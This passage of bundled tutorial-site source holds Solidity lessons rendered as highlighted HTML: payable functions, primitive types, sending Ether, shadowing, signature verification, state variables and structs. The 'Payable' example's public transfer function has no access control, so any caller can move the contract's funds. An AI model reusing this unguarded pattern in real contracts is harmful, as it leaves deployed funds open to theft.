class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getCar</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _index</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span>\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> owner, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> model, <span class=\"hljs-keyword\">uint</span> balance</span>)\n    </span>{\n        Car car = cars[_index];\n\n        <span class=\"hljs-keyword\">return</span> (car.owner(), car.model(), <span class=\"hljs-keyword\">address</span>(car).<span class=\"hljs-built_in\">balance</span>);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Payable\"\nexport const description = \"An example of how to use the keyword payable in Solidity\"\n\nconst html = `<p>Functions and addresses declared <code>payable</code> can receive <code>ether</code> into the contract.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Payable</span> </span>{\n    <span class=\"hljs-comment\">// Payable address can receive Ether</span>\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> <span class=\"hljs-keyword\">public</span> owner;\n\n    <span class=\"hljs-comment\">// Payable constructor can receive Ether</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        owner = <span class=\"hljs-keyword\">payable</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>);\n    }\n\n    <span class=\"hljs-comment\">// Function to deposit Ether into this contract.</span>\n    <span class=\"hljs-comment\">// Call this function along with some Ether.</span>\n    <span class=\"hljs-comment\">// The balance of this contract will be automatically updated.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n    }\n\n    <span class=\"hljs-comment\">// Call this function along with some Ether.</span>\n    <span class=\"hljs-comment\">// The function will throw an error since this function is not payable.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">notPayable</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n    }\n\n    <span class=\"hljs-comment\">// Function to withdraw all Ether from this contract.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">withdraw</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// get the amount of Ether stored in this contract</span>\n        <span class=\"hljs-keyword\">uint</span> amount = <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n\n        <span class=\"hljs-comment\">// send all Ether to owner</span>\n        <span class=\"hljs-comment\">// Owner can receive Ether since the address of owner is payable</span>\n        (<span class=\"hljs-keyword\">bool</span> success,) = owner.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(success, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n\n    <span class=\"hljs-comment\">// Function to transfer Ether from this contract to address from input</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\"><span class=\"hljs-built_in\">transfer</span></span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _to, <span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Note that \"to\" is declared as payable</span>\n        (<span class=\"hljs-keyword\">bool</span> success,) = _to.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> _amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(success, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Primitive Data Types\"\nexport const description = \"Primitive data types\"\n\nconst html = `<p>Here we introduce you to some primitive data types available in Solidity.</p>\n<ul>\n<li><code>boolean</code></li>\n<li><code>uint</code></li>\n<li><code>int</code></li>\n<li><code>address</code></li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Primitives</span> </span>{\n    <span class=\"hljs-keyword\">bool</span> boo = <span class=\"hljs-literal\">true</span>;\n\n    <span class=\"hljs-comment\">/*\n    uint stands for unsigned integer, meaning non negative integers\n    different sizes are available\n        uint8   ranges from 0 to 2 ** 8 - 1\n        uint16  ranges from 0 to 2 ** 16 - 1\n        ...\n        uint256 ranges from 0 to 2 ** 256 - 1\n    */</span>\n    <span class=\"hljs-keyword\">uint8</span> u8 = <span class=\"hljs-number\">1</span>;\n    <span class=\"hljs-keyword\">uint256</span> u256 = <span class=\"hljs-number\">456</span>;\n    <span class=\"hljs-keyword\">uint</span> u = <span class=\"hljs-number\">123</span>; <span class=\"hljs-comment\">// uint is an alias for uint256</span>\n\n    <span class=\"hljs-comment\">/*\n    Negative numbers are allowed for int types.\n    Like uint, different ranges are available from uint8 to uint256\n    */</span>\n    <span class=\"hljs-keyword\">int8</span> i8 = <span class=\"hljs-number\">-1</span>;\n    <span class=\"hljs-keyword\">int256</span> i256 = <span class=\"hljs-number\">456</span>;\n    <span class=\"hljs-keyword\">int</span> i = <span class=\"hljs-number\">-123</span>; <span class=\"hljs-comment\">// int is same as int256</span>\n\n    <span class=\"hljs-keyword\">address</span> addr = <span class=\"hljs-number\">0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c</span>;\n\n    <span class=\"hljs-comment\">// Default values</span>\n    <span class=\"hljs-comment\">// Unassigned variables have a default value</span>\n    <span class=\"hljs-keyword\">bool</span> defaultBoo; <span class=\"hljs-comment\">// false</span>\n    <span class=\"hljs-keyword\">uint</span> defaultUint; <span class=\"hljs-comment\">// 0</span>\n    <span class=\"hljs-keyword\">int</span> defaultInt; <span class=\"hljs-comment\">// 0</span>\n    <span class=\"hljs-keyword\">address</span> defaultAddr; <span class=\"hljs-comment\">// 0x0000000000000000000000000000000000000000</span>\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Sending Ether (transfer, send, call)\"\nexport const description = \"An example of sending Ether in Solidity\"\n\nconst html = `<h3 id=\"how-to-send-ether\">How to send Ether?</h3>\n<p>You can send Ether to other contracts by</p>\n<ul>\n<li><code>transfer</code> (2300 gas, throws error)</li>\n<li><code>send</code> (2300 gas, returns bool)</li>\n<li><code>call</code> (forward all gas or set gas, returns bool)</li>\n</ul>\n<h3 id=\"how-to-receive-ether\">How to receive Ether?</h3>\n<p>A contract receiving Ether must have at least one of the functions below</p>\n<ul>\n<li><code>receive() external payable</code></li>\n<li><code>fallback() external payable</code></li>\n</ul>\n<p><code>receive()</code> is called if <code>msg.data</code> is empty, otherwise <code>fallback()</code> is called.</p>\n<h3 id=\"which-method-should-you-use\">Which method should you use?</h3>\n<p><code>call</code> in combination with re-entrancy guard is the recommended method to use after December 2019.</p>\n<p>Guard against re-entrancy by</p>\n<ul>\n<li>making all state changes before calling other contracts</li>\n<li>using re-entrancy guard modifier</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">ReceiveEther</span> </span>{\n    <span class=\"hljs-comment\">/*\n    Which function is called, fallback() or receive()?\n\n           send Ether\n               |\n         msg.data is empty?\n              / \\\\\n            yes  no\n            /     \\\\\nreceive() exists?  fallback()\n         /   \\\\\n        yes   no\n        /      \\\\\n    receive()   fallback()\n    */</span>\n\n    <span class=\"hljs-comment\">// Function to receive Ether. msg.data must be empty</span>\n    <span class=\"hljs-keyword\">receive</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {}\n\n    <span class=\"hljs-comment\">// Fallback function is called when msg.data is not empty</span>\n    <span class=\"hljs-keyword\">fallback</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {}\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getBalance</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">SendEther</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">sendViaTransfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _to</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-comment\">// This function is no longer recommended for sending Ether.</span>\n        _to.<span class=\"hljs-built_in\">transfer</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">sendViaSend</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _to</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-comment\">// Send returns a boolean value indicating success or failure.</span>\n        <span class=\"hljs-comment\">// This function is not recommended for sending Ether.</span>\n        <span class=\"hljs-keyword\">bool</span> sent = _to.<span class=\"hljs-built_in\">send</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">sendViaCall</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _to</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-comment\">// Call returns a boolean value indicating success or failure.</span>\n        <span class=\"hljs-comment\">// This is the current recommended method to use.</span>\n        (<span class=\"hljs-keyword\">bool</span> sent, <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> data) = _to.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Shadowing Inherited State Variables\"\nexport const description = \"An example of shadowing state variables by inheritance\"\n\nconst html = `<p>Unlike functions, state variables cannot be overridden by re-declaring it\nin the child contract.</p>\n<p>Let&#39;s learn how to correctly override inherited state variables.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">public</span> name = <span class=\"hljs-string\">\"Contract A\"</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getName</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> name;\n    }\n}\n\n<span class=\"hljs-comment\">// Shadowing is disallowed in Solidity 0.6</span>\n<span class=\"hljs-comment\">// This will not compile</span>\n<span class=\"hljs-comment\">// contract B is A {</span>\n<span class=\"hljs-comment\">//     string public name = \"Contract B\";</span>\n<span class=\"hljs-comment\">// }</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">C</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-comment\">// This is the correct way to override inherited state variables.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) </span>{\n        name = <span class=\"hljs-string\">\"Contract C\"</span>;\n    }\n\n    <span class=\"hljs-comment\">// C.getName returns \"Contract C\"</span>\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Verifying Signature\"\nexport const description = \"An example of how to verify signatures in Solidity\"\n\nconst html = `<p>Messages can be signed off chain and then verified on chain using a smart contract.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/* Signature Verification\n\nHow to Sign and Verify\n# Signing\n1. Create message to sign\n2. Hash the message\n3. Sign the hash (off chain, keep your private key secret)\n\n# Verify\n1. Recreate hash from the original message\n2. Recover signer from signature and hash\n3. Compare recovered signer to claimed signer\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">VerifySignature</span> </span>{\n    <span class=\"hljs-comment\">/* 1. Unlock MetaMask account\n    ethereum.enable()\n    */</span>\n\n    <span class=\"hljs-comment\">/* 2. Get message hash to sign\n    getMessageHash(\n        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,\n        123,\n        \"coffee and donuts\",\n        1\n    )\n\n    hash = \"0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd\"\n    */</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getMessageHash</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">address</span> _to, <span class=\"hljs-keyword\">uint</span> _amount, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _message, <span class=\"hljs-keyword\">uint</span> _nonce\n    </span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>)\n    </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(_to, _amount, _message, _nonce));\n    }\n\n    <span class=\"hljs-comment\">/* 3. Sign message hash\n    # using browser\n    account = \"copy paste account of signer here\"\n    ethereum.request({ method: \"personal_sign\", params: [account, hash]}).then(console.log)\n\n    # using web3\n    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)\n\n    Signature will be different for different accounts\n    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getEthSignedMessageHash</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span> _messageHash</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>) </span>{\n        <span class=\"hljs-comment\">/*\n        Signature is produced by signing a keccak256 hash with the following format:\n        \"\\\\x19Ethereum Signed Message\\\\n\" + len(msg) + msg\n        */</span>\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(<span class=\"hljs-string\">\"\\\\x19Ethereum Signed Message:\\\\n32\"</span>, _messageHash));\n    }\n\n    <span class=\"hljs-comment\">/* 4. Verify signature\n    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd\n    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C\n    amount = 123\n    message = \"coffee and donuts\"\n    nonce = 1\n    signature =\n        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">verify</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">address</span> _signer,\n        <span class=\"hljs-keyword\">address</span> _to, <span class=\"hljs-keyword\">uint</span> _amount, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _message, <span class=\"hljs-keyword\">uint</span> _nonce,\n        <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> signature\n    </span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>)\n    </span>{\n        <span class=\"hljs-keyword\">bytes32</span> messageHash = getMessageHash(_to, _amount, _message, _nonce);\n        <span class=\"hljs-keyword\">bytes32</span> ethSignedMessageHash = getEthSignedMessageHash(messageHash);\n\n        <span class=\"hljs-keyword\">return</span> recoverSigner(ethSignedMessageHash, signature) == _signer;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">recoverSigner</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span> _ethSignedMessageHash, <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> _signature</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span></span>)\n    </span>{\n        (<span class=\"hljs-keyword\">bytes32</span> r, <span class=\"hljs-keyword\">bytes32</span> s, <span class=\"hljs-keyword\">uint8</span> v) = splitSignature(_signature);\n\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">ecrecover</span>(_ethSignedMessageHash, v, r, s);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">splitSignature</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> sig</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span> r, <span class=\"hljs-keyword\">bytes32</span> s, <span class=\"hljs-keyword\">uint8</span> v</span>)\n    </span>{\n        <span class=\"hljs-built_in\">require</span>(sig.<span class=\"hljs-built_in\">length</span> == <span class=\"hljs-number\">65</span>, <span class=\"hljs-string\">\"invalid signature length\"</span>);\n\n        <span class=\"hljs-keyword\">assembly</span> {\n            <span class=\"hljs-comment\">/*\n            First 32 bytes stores the length of the signature\n\n            add(sig, 32) = pointer of sig + 32\n            effectively, skips first 32 bytes of signature\n\n            mload(p) loads next 32 bytes starting at the memory address p into memory\n            */</span>\n\n            <span class=\"hljs-comment\">// first 32 bytes, after the length prefix</span>\n            r := <span class=\"hljs-built_in\">mload</span>(<span class=\"hljs-built_in\">add</span>(sig, <span class=\"hljs-number\">32</span>))\n            <span class=\"hljs-comment\">// second 32 bytes</span>\n            s := <span class=\"hljs-built_in\">mload</span>(<span class=\"hljs-built_in\">add</span>(sig, <span class=\"hljs-number\">64</span>))\n            <span class=\"hljs-comment\">// final byte (first byte of the next 32 bytes)</span>\n            v := <span class=\"hljs-built_in\">byte</span>(<span class=\"hljs-number\">0</span>, <span class=\"hljs-built_in\">mload</span>(<span class=\"hljs-built_in\">add</span>(sig, <span class=\"hljs-number\">96</span>)))\n        }\n\n        <span class=\"hljs-comment\">// implicitly return (r, s, v)</span>\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Reading and Writing to a State Variable\"\nexport const description = \"Reading and Writing to a State Variable\"\n\nconst html = `<p>To write or update a state variable you need to send a transaction.</p>\n<p>On the other hand, you can read state variables, for free, without any transaction fee.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">SimpleStorage</span> </span>{\n    <span class=\"hljs-comment\">// State variable to store a number</span>\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> num;\n\n    <span class=\"hljs-comment\">// You need to send a transaction to write to a state variable.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">set</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _num</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        num = _num;\n    }\n\n    <span class=\"hljs-comment\">// You can read from a state variable without sending a transaction.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> num;\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Structs\"\nexport const description = \"An example of how to use structs in Solidity\"\n\nconst html = `<p>You can define your own type by creating a <code>struct</code>.</p>\n<p>They are useful for grouping togther related data.</p>\n<p>Structs can be declared outside of a contract and imported in another contract.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Todos</span> </span>{\n    <span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">Todo</span> {\n        <span class=\"hljs-keyword\">string</span> text;\n        <span class=\"hljs-keyword\">bool</span> completed;\n    }\n\n    <span class=\"hljs-comment\">// An array of &#x27;Todo&#x27; structs</span>\n    Todo[] <span class=\"hljs-keyword\">public</span> todos;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">create</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _text</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// 3 ways to initialize a struct</span>\n        <span class=\"hljs-comment\">// - calling it like a function</span>\n        todos.<span class=\"hljs-built_in\">push</span>(Todo(_text, <span class=\"hljs-literal\">false</span>));\n\n        <span class=\"hljs-comment\">// key value mapping</span>\n        todos.<span class=\"hljs-built_in\">push</span>(Todo({\n            text: _text,\n            completed: <span class=\"hljs-literal\">false</span>\n        }));\n\n        <span class=\"hljs-comment\">// initialize an emoty struct and then update it</span>\n        Todo <span class=\"hljs-keyword\">memory</span> todo;\n        todo.text = _text;\n        <span class=\"hljs-comment\">// todo.completed initialized to false</span>\n\n        todos.<span class=\"hljs-built_in\">push</span>(todo);\n    }\n\n    <span class=\"hljs-comment\">// Solidity automatically created a getter for&#x27; todos&#x27; so</span>\n    <span class=\"hljs-comment\">// you don&#x27;t actually need this function.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _index</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span>\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> text, <span class=\"hljs-keyword\">bool</span> completed</span>)\n    </span>{\n        Todo <span class=\"hljs-keyword\">storage</span> todo = todos[_index];\n        <span class=\"hljs-keyword\">return</span> (todo.text, todo.completed);\n    }\n\n    <span class=\"hljs-comment\">// update text</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">update</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _index, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _text</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        Todo <span class=\"hljs-keyword\">storage</span> todo = todos[_index];\n        todo.text = _text;\n    }\n    <span class=\"hljs-comment\">// 